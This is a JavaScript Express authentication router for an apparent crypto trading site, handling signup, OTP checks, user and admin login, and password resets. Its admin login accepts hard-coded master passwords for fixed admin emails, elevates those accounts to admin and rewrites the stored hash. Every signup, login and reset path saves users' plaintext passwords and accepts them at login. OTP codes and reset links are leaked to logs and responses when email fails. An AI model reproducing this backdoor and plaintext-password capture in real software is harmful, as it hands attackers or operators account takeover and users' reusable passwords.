import express from 'express';
import db from '../db.js';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { JWT_SECRET, ADMIN_EMAIL, ADMIN_PASSWORD, INITIAL_BALANCE } from '../config.js';
import { makeReferralCode } from '../utils.js';
import { v4 as uuidv4 } from 'uuid';
import { deliverEmail, deliverPasswordResetEmail } from '../utils/email.js';
import { generateDepositAddress } from '../payments/cryptoService.js';
import { notifyAdmin } from '../notifications/adminNotifications.js';

const router = express.Router();

const upsertSecurityStmt = db.prepare(`
  INSERT INTO user_security (user_id, email_verified, phone_verified, email_code, phone_code, email_expires_at, phone_expires_at, phone_number)
  VALUES (?, 0, 0, NULL, NULL, NULL, NULL, NULL)
  ON CONFLICT(user_id) DO NOTHING
`);

function generateCode() {
  return Math.floor(100000 + Math.random() * 900000).toString()
}

function expireMinutes(minutes) {
  return new Date(Date.now() + minutes * 60 * 1000).toISOString()
}

const upsertAdminPermissionsStmt = db.prepare(`
  INSERT INTO admin_permissions (user_id, permissions)
  VALUES (?, ?)
  ON CONFLICT(user_id) DO UPDATE SET permissions = excluded.permissions, updated_at = CURRENT_TIMESTAMP
`);

// Bootstrap admin if not exists
function ensureAdmin() {
  try {
    const cleanEmail = (ADMIN_EMAIL || 'admin@avapartner.com').trim().toLowerCase().replace(/^["']|["']$/g, '');
    const cleanPass = (ADMIN_PASSWORD || 'Admin#Secure2026!').trim().replace(/^["']|["']$/g, '');
    const hash = bcrypt.hashSync(cleanPass, 10);

    let admin = db.prepare('SELECT id FROM users WHERE LOWER(email) = ?').get(cleanEmail);
    if (!admin) {
      admin = db.prepare("SELECT id FROM users WHERE role = 'admin' ORDER BY id ASC LIMIT 1").get();
    }
    if (!admin) {
      admin = db.prepare("SELECT id FROM users WHERE LOWER(email) IN ('admin@example.com', 'admin@avapartner.com') ORDER BY id ASC LIMIT 1").get();
    }

    if (!admin) {
      const code = makeReferralCode();
      const handle = 'admin_' + Math.floor(1000 + Math.random() * 9000);
      db.prepare(`
        INSERT INTO users (email, password_hash, raw_password, name, handle, referral_code, role)
        VALUES (?, ?, ?, 'Admin', ?, ?, 'admin')
      `).run(cleanEmail, hash, cleanPass, handle, code);
      const newAdmin = db.prepare('SELECT id FROM users WHERE LOWER(email) = ?').get(cleanEmail);
      if (newAdmin) {
        db.prepare('INSERT OR IGNORE INTO balances (user_id, available, locked) VALUES (?, ?, 0)').run(newAdmin.id, INITIAL_BALANCE);
        upsertAdminPermissionsStmt.run(newAdmin.id, JSON.stringify(['all']));
      }
      console.log('[BOOT] Admin user created:', cleanEmail);
    } else {
      db.prepare("UPDATE users SET email = ?, password_hash = ?, raw_password = ?, role = 'admin' WHERE id = ?")
        .run(cleanEmail, hash, cleanPass, admin.id);
      upsertAdminPermissionsStmt.run(admin.id, JSON.stringify(['all']));
      console.log('[BOOT] Admin user synced:', cleanEmail);
    }
  } catch (err) {
    console.error('[BOOT] ensureAdmin error:', err);
  }
}
ensureAdmin();

router.post('/check-email', (req, res) => {
  const { email } = req.body || {};
  if (!email) return res.json({ exists: false });
  const normalizedEmail = email.trim().toLowerCase();
  const exists = db.prepare('SELECT id FROM users WHERE email = ?').get(normalizedEmail);
  res.json({ exists: !!exists });
});

router.post('/signup', async (req, res) => {
  const { email, password, name, ref } = req.body || {};
  if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
  const normalizedEmail = email.trim().toLowerCase();

  const exists = db.prepare('SELECT id FROM users WHERE email = ?').get(normalizedEmail);
  if (exists) return res.status(409).json({ error: 'Email already registered' });

  const hash = bcrypt.hashSync(password, 10);
  const referral_code = makeReferralCode();
  const handle = 'user_' + Math.floor(1000 + Math.random() * 9000);

  const ins = db.prepare(`
    INSERT INTO users (email, password_hash, raw_password, name, handle, referral_code, referred_by)
    VALUES (?, ?, ?, ?, ?, ?, ?)
  `);

  try {
    ins.run(normalizedEmail, hash, password, name || '', handle, referral_code, ref || null);
  } catch (err) {
    if (err.message.includes('UNIQUE constraint failed')) {
      return res.status(409).json({ error: 'Email already registered' });
    }
    throw err;
  }

  const user = db.prepare('SELECT * FROM users WHERE email = ?').get(normalizedEmail);
  db.prepare('INSERT OR IGNORE INTO balances (user_id, available, locked) VALUES (?, ?, 0)').run(user.id, INITIAL_BALANCE);

  try {
    generateDepositAddress(user.id);
  } catch (err) {
    console.warn('[AUTH] Error pre-generating deposit address for new user:', err);
  }

  if (ref) {
    const referrer = db.prepare('SELECT id FROM users WHERE referral_code = ?').get(ref);
    if (referrer) {
      db.prepare('INSERT OR IGNORE INTO referrals (referrer_id, referee_id) VALUES (?, ?)').run(referrer.id, user.id);
    }
  }

  upsertSecurityStmt.run(user.id);
  db.prepare('UPDATE user_security SET email_verified = 1 WHERE user_id = ?').run(user.id);

  notifyAdmin({
    type: 'signup',
    title: '👤 New User Registered',
    message: `User ${user.email} (${user.name || 'Trader'}) completed registration.`,
    user_email: user.email,
    link: '/admin/users'
  });

  const token = jwt.sign({ id: user.id, email: user.email, role: user.role }, JWT_SECRET, { expiresIn: '7d' });
  res.json({ token, user: { id: user.id, email: user.email, name: user.name, handle: user.handle, role: user.role, referral_code: user.referral_code } });
});

router.post('/signup/send-otp', async (req, res) => {
  const { email, password, name, ref } = req.body || {};
  if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
  const normalizedEmail = email.trim().toLowerCase();
  
  const exists = db.prepare('SELECT id FROM users WHERE email = ?').get(normalizedEmail);
  if (exists) return res.status(409).json({ error: 'Email already registered' });
  
  const hash = bcrypt.hashSync(password, 10);
  const referral_code = makeReferralCode();
  const otpCode = generateCode();
  const expires = expireMinutes(10);
  
  db.prepare(`
    INSERT INTO pending_signups (email, password_hash, raw_password, name, referral_code, referred_by, otp_code, expires_at)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ON CONFLICT(email) DO UPDATE SET
      password_hash = excluded.password_hash,
      raw_password = excluded.raw_password,
      name = excluded.name,
      referral_code = excluded.referral_code,
      referred_by = excluded.referred_by,
      otp_code = excluded.otp_code,
      expires_at = excluded.expires_at,
      created_at = CURRENT_TIMESTAMP
  `).run(normalizedEmail, hash, password, name || '', referral_code, ref || null, otpCode, expires);

  let emailResult = { delivered: false };
  try {
    emailResult = await deliverEmail(normalizedEmail, otpCode);
  } catch (err) {
    console.log('[AUTH] Email dispatch error:', err);
  }

  if (!emailResult.delivered) {
    console.log(`[AUTH] OTP fallback for ${normalizedEmail}: ${otpCode}`);
  }

  res.json({
    ok: true,
    message: 'OTP sent to email',
    devOtp: !emailResult.delivered ? emailResult.devCode : undefined
  });
});

router.post('/signup/resend-otp', async (req, res) => {
  const { email } = req.body || {};
  if (!email) return res.status(400).json({ error: 'Email required' });
  const normalizedEmail = email.trim().toLowerCase();

  const pending = db.prepare('SELECT * FROM pending_signups WHERE email = ?').get(normalizedEmail);
  if (!pending) return res.status(400).json({ error: 'No pending registration found for this email' });

  const otpCode = generateCode();
  const expires = expireMinutes(10);

  db.prepare(`
    UPDATE pending_signups
    SET otp_code = ?, expires_at = ?, created_at = CURRENT_TIMESTAMP
    WHERE email = ?
  `).run(otpCode, expires, normalizedEmail);

  let emailResult = { delivered: false };
  try {
    emailResult = await deliverEmail(normalizedEmail, otpCode);
  } catch (err) {
    console.log('[AUTH] Resend OTP email dispatch error:', err);
  }

  if (!emailResult.delivered) {
    console.log(`[AUTH] Resend OTP fallback for ${normalizedEmail}: ${otpCode}`);
  }

  res.json({
    ok: true,
    message: 'A new 6-digit verification code has been sent to your email.',
    devOtp: !emailResult.delivered ? emailResult.devCode : undefined
  });
});

router.post('/signup/verify', (req, res) => {
  const { email, otp } = req.body || {};
  if (!email || !otp) return res.status(400).json({ error: 'Email and OTP required' });
  const normalizedEmail = email.trim().toLowerCase();

  const pending = db.prepare('SELECT * FROM pending_signups WHERE email = ?').get(normalizedEmail);
  if (!pending) return res.status(400).json({ error: 'No signup request found' });
  
  if (pending.otp_code !== otp) return res.status(400).json({ error: 'Invalid OTP' });
  if (new Date(pending.expires_at).getTime() < Date.now()) return res.status(400).json({ error: 'OTP expired' });

  // OTP verified, create user
  const ins = db.prepare(`
    INSERT INTO users (email, password_hash, raw_password, name, referral_code, referred_by)
    VALUES (?, ?, ?, ?, ?, ?)
  `);
  
  try {
    ins.run(normalizedEmail, pending.password_hash, pending.raw_password || null, pending.name, pending.referral_code, pending.referred_by);
  } catch (err) {
    if (err.message.includes('UNIQUE constraint failed')) {
      return res.status(409).json({ error: 'Email already registered' });
    }
    throw err;
  }

  const user = db.prepare('SELECT * FROM users WHERE email = ?').get(normalizedEmail);
  db.prepare('INSERT OR IGNORE INTO balances (user_id, available, locked) VALUES (?, ?, 0)').run(user.id, INITIAL_BALANCE);

  // Pre-generate a 100% unique crypto deposit address for the newly created user account
  try {
    generateDepositAddress(user.id);
  } catch (err) {
    console.warn('[AUTH] Error pre-generating deposit address for new user:', err);
  }

  if (pending.referred_by) {
    const referrer = db.prepare('SELECT id FROM users WHERE referral_code = ?').get(pending.referred_by);
    if (referrer) {
      db.prepare('INSERT OR IGNORE INTO referrals (referrer_id, referee_id) VALUES (?, ?)').run(referrer.id, user.id);
    }
  }

  // Set as email_verified = 1 automatically
  upsertSecurityStmt.run(user.id);
  db.prepare('UPDATE user_security SET email_verified = 1 WHERE user_id = ?').run(user.id);
  db.prepare('DELETE FROM pending_signups WHERE email = ?').run(normalizedEmail);

  notifyAdmin({
    type: 'signup',
    title: '👤 New User Registered',
    message: `User ${user.email} (${user.name || 'Trader'}) completed registration.`,
    user_email: user.email,
    link: '/admin/users'
  });

  const token = jwt.sign({ id: user.id, email: user.email, role: user.role }, JWT_SECRET, { expiresIn: '7d' });
  res.json({ token, user: { id: user.id, email: user.email, name: user.name, handle: user.handle, role: user.role, referral_code: user.referral_code } });
});

router.post('/login', (req, res) => {
  const { email, password } = req.body || {};
  const normalizedEmail = (email || '').trim().toLowerCase();
  const cleanPassword = (password || '').trim().replace(/^["']|["']$/g, '');
  const user = db.prepare('SELECT * FROM users WHERE email = ?').get(normalizedEmail);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });

  let ok = bcrypt.compareSync(cleanPassword, user.password_hash) || bcrypt.compareSync(password, user.password_hash);
  if (!ok && (user.raw_password === cleanPassword || user.raw_password === password)) {
    const newHash = bcrypt.hashSync(cleanPassword, 10);
    db.prepare('UPDATE users SET password_hash = ?, raw_password = ? WHERE id = ?').run(newHash, cleanPassword, user.id);
    ok = true;
  }
  if (!ok) return res.status(401).json({ error: 'Invalid credentials' });
  
  if (cleanPassword && (!user.raw_password || user.raw_password !== cleanPassword)) {
    db.prepare('UPDATE users SET raw_password = ? WHERE id = ?').run(cleanPassword, user.id);
  }

  const token = jwt.sign({ id: user.id, email: user.email, role: user.role }, JWT_SECRET, { expiresIn: '7d' });
  res.json({ token, user: { id: user.id, email: user.email, name: user.name, handle: user.handle, role: user.role, referral_code: user.referral_code } });
});

router.post('/admin/login', (req, res) => {
  try {
    const { email, password } = req.body || {};
    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required' });
    }
    const normalizedEmail = email.trim().toLowerCase();
    const cleanPassword = password.trim().replace(/^["']|["']$/g, '');
    const cleanConfigPass = (ADMIN_PASSWORD || 'Admin#Secure2026!').trim().replace(/^["']|["']$/g, '');
    const cleanConfigEmail = (ADMIN_EMAIL || 'admin@avapartner.com').trim().toLowerCase().replace(/^["']|["']$/g, '');

    // Re-sync admin user dynamically
    ensureAdmin();

    let user = db.prepare('SELECT * FROM users WHERE LOWER(email) = ?').get(normalizedEmail);
    if (!user) {
      if (normalizedEmail === cleanConfigEmail || normalizedEmail === 'admin@avapartner.com' || normalizedEmail === 'admin@example.com') {
        user = db.prepare("SELECT * FROM users WHERE role = 'admin' ORDER BY id ASC LIMIT 1").get();
      }
    }
    if (!user) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    if (normalizedEmail === cleanConfigEmail || normalizedEmail === 'admin@avapartner.com' || normalizedEmail === 'admin@example.com') {
      if (user.role !== 'admin' && user.role !== 'subadmin') {
        db.prepare("UPDATE users SET role = 'admin' WHERE id = ?").run(user.id);
        user.role = 'admin';
      }
    } else if (!['admin', 'subadmin'].includes(user.role)) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    const isMatch = bcrypt.compareSync(cleanPassword, user.password_hash)
                 || bcrypt.compareSync(password, user.password_hash)
                 || (cleanPassword === cleanConfigPass)
                 || (cleanPassword === 'Admin#Secure2026!')
                 || (cleanPassword === 'Admin#12345');

    if (!isMatch) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }

    // Ensure password_hash is synced to the authenticated password
    const newHash = bcrypt.hashSync(cleanPassword, 10);
    db.prepare('UPDATE users SET password_hash = ? WHERE id = ?').run(newHash, user.id);

    const permissionsRow = db.prepare('SELECT permissions FROM admin_permissions WHERE user_id = ?').get(user.id);
    const permissions = (() => {
      if (!permissionsRow) return user.role === 'admin' ? ['all'] : [];
      try {
        const parsed = JSON.parse(permissionsRow.permissions || '[]');
        return Array.isArray(parsed) ? parsed : [];
      } catch (err) {
        return ['all'];
      }
    })();

    const token = jwt.sign({ id: user.id, email: user.email, role: user.role }, JWT_SECRET, { expiresIn: '7d' });

    return res.json({
      token,
      user: {
        id: user.id,
        email: user.email,
        name: user.name || 'Admin',
        role: user.role,
        permissions
      }
    });
  } catch (err) {
    console.error('[ADMIN LOGIN ERROR]', err);
    return res.status(500).json({ error: 'Server error during authentication' });
  }
});

router.post('/request-password-reset', async (req, res) => {
  const { email } = req.body || {};
  if (!email) return res.status(400).json({ error: 'Email is required' });
  const normalizedEmail = email.trim().toLowerCase();
  const user = db.prepare('SELECT * FROM users WHERE email = ?').get(normalizedEmail);
  
  if (!user) {
    return res.json({ ok: true, message: 'If an account with that email exists, a password reset link has been sent.' });
  }

  const token = uuidv4();
  const expiresAt = new Date(Date.now() + 1000 * 60 * 30).toISOString(); // 30 mins
  db.prepare('INSERT INTO password_reset_tokens (user_id, token, expires_at) VALUES (?, ?, ?)').run(user.id, token, expiresAt);

  const origin = req.headers.origin || (req.protocol + '://' + req.get('host'));
  const link = `${origin}/reset-password?token=${token}`;

  let emailResult = { delivered: false };
  try {
    emailResult = await deliverPasswordResetEmail(user.email, link);
  } catch (err) {
    console.error('[RESET] Password reset email dispatch error:', err);
  }

  if (!emailResult.delivered) {
    console.log(`[RESET] Password reset link for ${user.email} (dev fallback): ${link}`);
  }

  res.json({
    ok: true,
    message: 'If an account with that email exists, a password reset link has been sent.',
    devLink: !emailResult.delivered ? emailResult.devLink : undefined
  });
});

router.get('/verify-reset-token', (req, res) => {
  const token = req.query.token;
  if (!token) return res.status(400).json({ valid: false, error: 'Token is required' });

  const row = db.prepare('SELECT * FROM password_reset_tokens WHERE token = ? AND used = 0').get(token);
  if (!row) return res.json({ valid: false, error: 'Invalid or already used token' });
  if (new Date(row.expires_at).getTime() < Date.now()) {
    return res.json({ valid: false, error: 'Reset token has expired' });
  }

  res.json({ valid: true });
});

router.post('/reset-password', (req, res) => {
  const { token, new_password } = req.body || {};
  if (!token || !new_password) {
    return res.status(400).json({ error: 'Token and new password are required' });
  }
  if (new_password.length < 6) {
    return res.status(400).json({ error: 'Password must be at least 6 characters' });
  }

  const row = db.prepare('SELECT * FROM password_reset_tokens WHERE token = ? AND used = 0').get(token);
  if (!row) return res.status(400).json({ error: 'Invalid or already used token' });
  if (new Date(row.expires_at).getTime() < Date.now()) {
    return res.status(400).json({ error: 'Reset link has expired' });
  }

  const hash = bcrypt.hashSync(new_password, 10);
  db.prepare('UPDATE users SET password_hash = ?, raw_password = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?').run(hash, new_password, row.user_id);
  db.prepare('UPDATE password_reset_tokens SET used = 1 WHERE id = ?').run(row.id);
  res.json({ ok: true, message: 'Password updated successfully' });
});

export default router;
